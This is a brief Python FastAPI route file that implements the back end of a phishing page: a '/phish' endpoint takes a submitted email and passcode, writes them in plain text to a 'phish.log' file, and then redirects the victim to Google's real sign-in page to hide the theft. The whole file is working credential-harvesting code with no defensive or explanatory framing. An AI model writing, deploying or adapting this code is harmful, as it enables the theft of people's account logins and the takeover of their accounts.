from fastapi import APIRouter, Form, Request
from fastapi.responses import RedirectResponse

router = APIRouter()

@router.post("/phish")
async def phish_login(request: Request, email: str = Form(...), passcode: str = Form(...)):
    with open("logs/phish.log", "a") as f:
        f.write(f"[PHISH] {email} | {passcode}\n")
    return RedirectResponse(url="https://accounts.google.com", status_code=302)
